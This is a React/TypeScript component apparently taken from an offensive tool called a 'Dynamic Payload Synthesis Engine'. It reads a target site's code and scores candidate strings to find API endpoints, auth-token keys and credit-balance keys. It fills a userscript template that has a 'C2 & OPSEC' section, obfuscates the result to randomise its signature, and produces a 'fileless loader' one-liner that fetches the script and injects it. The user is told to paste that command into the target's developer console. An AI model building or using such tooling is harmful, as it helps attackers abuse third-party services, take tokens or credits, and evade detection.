import React, { useState, useEffect } from 'react';
import { Button } from './Button.tsx';
import { ENGINE_USERSCRIPT_TEMPLATE } from '../constants.ts';
import { CheckIcon, CopyIcon } from './Icons.tsx';
import { useAppContext } from '../AppContext.tsx';
import { TargetProfile } from '../types.ts';

// Informs TypeScript that the 'parseltongue' library is available on the global window object.
declare const parseltongue: (code: string, options?: any) => string;

interface PayloadSynthesizerProps {
    initialCode: string;
    onClose: () => void;
}

// Tokenization function to split by delimiters and case changes for advanced analysis.
const tokenize = (str: string): string[] => {
    if (!str) return [];
    // Splits by common delimiters, then splits camelCase/PascalCase, filters out empty strings.
    return str.toLowerCase()
        .split(/[\s/._-]/) 
        .flatMap(part => part.replace(/([a-z0-9])([A-Z])/g, '$1 $2').split(' '))
        .filter(Boolean);
};

export const PayloadSynthesizer = ({ initialCode, onClose }: PayloadSynthesizerProps) => {
    const { targetHostname: contextHostname, setTargetHostname: setContextHostname } = useAppContext();
    const [codeInput, setCodeInput] = useState(initialCode);
    const [targetHostname, setTargetHostname] = useState(contextHostname || '');
    const [statusLog, setStatusLog] = useState<string[]>([]);
    const [isLoading, setIsLoading] = useState(false);
    const [outputScript, setOutputScript] = useState('');
    const [isCopied, setIsCopied] = useState(false);
    const [stagedUrl, setStagedUrl] = useState<string | null>(null);
    const [loaderCommand, setLoaderCommand] = useState<string | null>(null);
    const [isLoaderCopied, setIsLoaderCopied] = useState(false);
    const [obfuscate, setObfuscate] = useState(true);

    useEffect(() => {
        setCodeInput(initialCode);
    }, [initialCode]);
    
    useEffect(() => {
        setTargetHostname(contextHostname || '');
    }, [contextHostname]);

    // Cleanup effect to revoke the object URL on unmount to prevent memory leaks.
    useEffect(() => {
        return () => {
            if (stagedUrl) {
                URL.revokeObjectURL(stagedUrl);
            }
        };
    }, [stagedUrl]);
    
    const handleHostnameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const newHostname = e.target.value;
        setTargetHostname(newHostname);
        setContextHostname(newHostname); // Two-way sync with context
    };

    const addToLog = (message: string) => {
        setStatusLog(prev => [...prev.slice(-100), `[${new Date().toLocaleTimeString()}] ${message}`]);
    };

    // Advanced heuristic analysis with tokenization and weighted scoring.
    const analyzeCodeWithHeuristics = (code: string): Partial<{[key in keyof TargetProfile]: { match: string; score: number }}> => {
        addToLog("INFO: Starting Automated Heuristic Analysis Engine (AHE)...");

        const urls = [...code.matchAll(/['"`](\s*\/[a-zA-Z0-9\/._-]*?(\{task(I|i)d\})?[a-zA-Z0-9\/._-]*?)\s*['"`]/g)].map(m => m[1].trim());
        const keys = [...code.matchAll(/['"`]([a-zA-Z0-9_.-]+?)['"`](?=\s*:)/g)].map(m => m[1]);
        const storageKeys = [...code.matchAll(/\.(getItem|setItem)\s*\(\s*['"`](.+?)['"`]\s*\)/g)].map(m => m[2]);
        const allKeys = [...new Set([...keys, ...storageKeys])];

        const keywordMatrix = {
            generateEndpoint: { create: 3, generate: 3, upload: 2, start: 2, process: 1, submit: 1, new: 1, add: 1, image: 1, video: 1, api: 1, v1: 1, v2: 1, v3: 1, v4: 1 },
            statusEndpoint: { status: 3, progress: 3, task: 2, job: 2, check: 1, poll: 1, state: 1 },
            creditsEndpoint: { credit: 3, balance: 3, points: 2, usage: 2, user: 1, account: 1 },
            sessionEndpoint: { session: 3, login: 3, logout: 3, auth: 2, signin: 3, signout: 3, token: 1, user: 1 },
            uploadEndpoint: { upload: 3, file: 2, media: 2, image: 1, video: 1, attachment: 2, asset: 1 },
            authTokenKey: { token: 3, jwt: 3, auth: 2, session: 2, key: 1, secret: 1, authorization: 2, bearer: 2 },
            taskIdKey: { taskid: 4, jobid: 4, id: 1, uid: 1, task_id: 4, job_id: 4, requestid: 3 },
            creditAmountKey: { credit: 3, balance: 3, points: 2, amount: 2, remaining: 1, value: 1, total: 1 },
        };

        const findBestMatch = (candidates: string[], weights: Record<string, number>, type: string): { match: string; score: number } => {
            const threshold = 2; // Confidence threshold.
            if (candidates.length === 0) {
                addToLog(`INFO: No candidates found for ${type}.`);
                return { match: '', score: 0 };
            }

            const ranked = candidates
                .map(candidate => {
                    const tokens = tokenize(candidate);
                    const score = tokens.reduce((acc, token) => acc + (weights[token] || 0), 0);
                    return { match: candidate, score };
                })
                .filter(c => c.score >= threshold)
                .sort((a, b) => b.score - a.score);
            
            if(ranked.length > 0) {
                addToLog(`SUCCESS: Identified potential ${type}: "${ranked[0].match}" (Score: ${ranked[0].score})`);
                return ranked[0];
            }
            addToLog(`WARN: No high-confidence match for ${type}. Analyzed ${candidates.length} candidate(s).`);
            return { match: '', score: 0 };
        };

        const results: Partial<{[key in keyof TargetProfile]: { match: string; score: number }}> = {};
        results.generateEndpoint = findBestMatch(urls, keywordMatrix.generateEndpoint, 'Generation Endpoint');
        results.statusEndpoint = findBestMatch(urls, keywordMatrix.statusEndpoint, 'Status Endpoint');
        results.creditsEndpoint = findBestMatch(urls, keywordMatrix.creditsEndpoint, 'Credits Endpoint');
        results.sessionEndpoint = findBestMatch(urls, keywordMatrix.sessionEndpoint, 'Session Endpoint');
        results.uploadEndpoint = findBestMatch(urls, keywordMatrix.uploadEndpoint, 'Upload Endpoint');
        results.authTokenKey = findBestMatch(allKeys, keywordMatrix.authTokenKey, 'Auth Token Key');
        results.taskIdKey = findBestMatch(allKeys, keywordMatrix.taskIdKey, 'Task ID Key');
        results.creditAmountKey = findBestMatch(allKeys, keywordMatrix.creditAmountKey, 'Credit Amount Key');
        
        addToLog("INFO: Heuristic analysis complete.");
        return results;
    };
    
    const handleSynthesize = async () => {
        setIsLoading(true);
        setStatusLog([]);
        setOutputScript('');
        setStagedUrl(null);
        setLoaderCommand(null);
        
        addToLog("INIT: Dynamic Payload Synthesis Engine activated.");
        addToLog(`TARGET: ${targetHostname}`);

        await new Promise(res => setTimeout(res, 300));
        
        const analysisResults = analyzeCodeWithHeuristics(codeInput);

        await new Promise(res => setTimeout(res, 300));

        addToLog("INFO: Synthesizing userscript from master template...");
        let script = ENGINE_USERSCRIPT_TEMPLATE;
        script = script.replace(/__TARGET_HOSTNAME__/g, targetHostname);
        script = script.replace(/__TARGET_MATCH_URL__/g, `*://${targetHostname}`);
        
        const formatResult = (result?: { match: string; score: number }) => {
            if (!result || !result.match || result.score === 0) return 'N/A (Confidence: Low)';
            return `${result.match} (Score: ${result.score})`;
        };

        const analysisComment = `
    // --- [ AHE Intelligence Briefing ] ---
    // The Automated Heuristic Analysis Engine (AHE) discovered the following
    // high-probability values from the target codebase. Review and use them to
    // formulate commands in the developer console.
    /*
        [+] Generation Endpoint: ${formatResult(analysisResults.generateEndpoint)}
        [+] Status Endpoint:     ${formatResult(analysisResults.statusEndpoint)}
        [+] Credits Endpoint:    ${formatResult(analysisResults.creditsEndpoint)}
        [+] Session Endpoint:    ${formatResult(analysisResults.sessionEndpoint)}
        [+] Upload Endpoint:     ${formatResult(analysisResults.uploadEndpoint)}
        -------------------------------------------------
        [+] Auth Token Key:      ${formatResult(analysisResults.authTokenKey)}
        [+] Task ID Key:         ${formatResult(analysisResults.taskIdKey)}
        [+] Credit Amount Key:   ${formatResult(analysisResults.creditAmountKey)}
    */
        `.trim();
        
        script = script.replace("// --- [ C2 & OPSEC Configuration ] ---", `// --- [ C2 & OPSEC Configuration ] ---\n\n${analysisComment}`);
        
        let finalScript = script;

        if (obfuscate) {
            addToLog("INFO: Engaging Parseltongue polymorphic engine...");
            await new Promise(res => setTimeout(res, 100));
            try {
                finalScript = parseltongue(script, {
                    iterations: 2,
                    stringEncoding: true,
                    deadCode: true,
                    renameVars: true,
                    controlFlow: true
                });
                addToLog("SUCCESS: Payload obfuscated. Signature randomized.");
            } catch (e) {
                addToLog("ERROR: Parseltongue engine failed. Payload is NOT obfuscated.");
                console.error("Parseltongue obfuscation error:", e);
            }
        }

        setOutputScript(finalScript);
        addToLog("SUCCESS: Synthesis complete. Payload generated.");
        setIsLoading(false);
    };

    const copyToClipboard = (text: string, setCopiedState: React.Dispatch<React.SetStateAction<boolean>>) => {
        navigator.clipboard.writeText(text).then(() => {
            setCopiedState(true);
            setTimeout(() => setCopiedState(false), 2500);
        });
    };

    const handleStageForDelivery = () => {
        if (!outputScript) {
            addToLog("ERROR: No output script available to stage.");
            return;
        }

        addToLog("INFO: Staging payload for fileless delivery...");

        if (stagedUrl) {
            URL.revokeObjectURL(stagedUrl);
        }

        const blob = new Blob([outputScript], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        setStagedUrl(url);

        const command = `fetch('${url}').then(r=>r.text()).then(t=>document.head.appendChild(document.createElement('script')).textContent=t);`;
        setLoaderCommand(command);

        addToLog("SUCCESS: Payload staged. Loader command is ready.");
        addToLog("INFO: Paste the 'Fileless Loader' command into the target's developer console.");
    };

    return (
        <div className="absolute inset-0 bg-black/90 backdrop-blur-md z-20 flex flex-col p-4 animate-fade-in">
            <div className="flex justify-between items-center flex-shrink-0 mb-4">
                <h3 className="text-xl font-heading">Dynamic Payload Synthesis Engine</h3>
                <button
                    onClick={onClose}
                    className="p-1.5 rounded-full hover:bg-white/10 focus:outline-none focus:ring-1 focus:ring-[var(--hud-color)]"
                    aria-label="Close Synthesizer"
                >
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 flex-grow min-h-0">
                {/* Left Panel: Inputs & Controls */}
                <div className="flex flex-col space-y-4">
                    <div>
                        <label htmlFor="target-hostname-synth" className="block text-sm uppercase tracking-wider text-[var(--hud-color-darker)] mb-1">
                            Target Hostname
                        </label>
                        <input
                            id="target-hostname-synth"
                            type="text"
                            value={targetHostname}
                            onChange={handleHostnameChange}
                            className="block w-full p-2.5 font-mono text-sm text-[var(--hud-color)] bg-black border border-[var(--hud-color-darkest)] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-black focus:ring-[var(--bright-cyan)] placeholder:text-[var(--hud-color-darker)] transition-all duration-150"
                            placeholder="e.g., api.example.com"
                            disabled={isLoading}
                        />
                    </div>
                    <div className="flex-grow flex flex-col min-h-0">
                        <label htmlFor="code-input-synth" className="block text-sm uppercase tracking-wider text-[var(--hud-color-darker)] mb-1">
                            Target Codebase for Analysis
                        </label>
                        <textarea
                            id="code-input-synth"
                            value={codeInput}
                            onChange={(e) => setCodeInput(e.target.value)}
                            className="block w-full h-full p-3 font-mono text-sm text-[var(--hud-color)] bg-black border border-[var(--hud-color-darkest)] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-black focus:ring-[var(--bright-cyan)] resize-none transition-all duration-150"
                            disabled={isLoading}
                        />
                    </div>
                    <div className="flex items-center space-x-2 pt-2">
                        <input
                            id="obfuscate-payload"
                            type="checkbox"
                            checked={obfuscate}
                            onChange={(e) => setObfuscate(e.target.checked)}
                            className="form-checkbox h-4 w-4 bg-black/50 border-[var(--hud-color-darkest)] text-[var(--hud-color)] focus:ring-[var(--hud-color)] disabled:opacity-50"
                            disabled={isLoading}
                        />
                        <label htmlFor="obfuscate-payload" className={`text-sm ${isLoading ? 'text-[var(--hud-color-darker)]/50' : 'text-[var(--hud-color-darker)]'} cursor-pointer`}>
                            Polymorphic Obfuscation (Parseltongue Engine)
                        </label>
                    </div>
                    <Button onClick={handleSynthesize} disabled={!targetHostname || isLoading} isLoading={isLoading}>
                        [ Analyze & Synthesize Payload ]
                    </Button>
                </div>

                {/* Right Panel: Log & Output */}
                <div className="flex flex-col space-y-4 min-h-0">
                    <div className="flex-grow flex flex-col min-h-0 border border-[var(--hud-color-darkest)] bg-black/50 p-3">
                         <h4 className="text-sm uppercase tracking-wider text-[var(--hud-color-darker)] mb-2 flex-shrink-0">AHE Status Log</h4>
                         <div className="overflow-y-auto flex-grow font-mono text-xs text-[var(--hud-color-darker)] space-y-1">
                            {statusLog.map((log, i) => <p key={i} className="animate-fade-in">{log}</p>)}
                            {isLoading && <p className="animate-cyan-pulse">ANALYZING...</p>}
                         </div>
                    </div>
                    {outputScript && (
                        <div className="flex flex-col space-y-2 animate-fade-in flex-shrink-0">
                            <div className="relative">
                                <textarea
                                    readOnly
                                    value={outputScript}
                                    className="block w-full h-32 p-3 font-mono text-xs text-[var(--hud-color)] bg-black border border-[var(--hud-color-darkest)] resize-y transition-all duration-150"
                                />
                                 <button onClick={() => copyToClipboard(outputScript, setIsCopied)} className="absolute top-2 right-2 p-1.5 bg-black/50 text-[var(--hud-color)] hover:bg-[var(--hud-color)] hover:text-black">
                                    {isCopied ? <CheckIcon className="w-4 h-4" /> : <CopyIcon className="w-4 h-4" />}
                                 </button>
                            </div>
                            <Button onClick={handleStageForDelivery} variant="secondary">Stage for Delivery</Button>
                        </div>
                    )}
                     {loaderCommand && (
                        <div className="flex flex-col space-y-2 animate-fade-in flex-shrink-0">
                             <h4 className="text-sm uppercase tracking-wider text-[var(--hud-color-darker)]">Fileless Loader</h4>
                             <div className="relative">
                                 <input
                                    readOnly
                                    value={loaderCommand}
                                    className="block w-full p-2 font-mono text-xs text-[var(--hud-color)] bg-black border border-[var(--hud-color-darkest)] pr-10 transition-all duration-150"
                                />
                                <button onClick={() => copyToClipboard(loaderCommand, setIsLoaderCopied)} className="absolute top-1/2 right-2 -translate-y-1/2 p-1.5 bg-black/50 text-[var(--hud-color)] hover:bg-[var(--hud-color)] hover:text-black">
                                     {isLoaderCopied ? <CheckIcon className="w-4 h-4" /> : <CopyIcon className="w-4 h-4" />}
                                 </button>
                             </div>
                        </div>
                     )}
                </div>
            </div>
        </div>
    );
};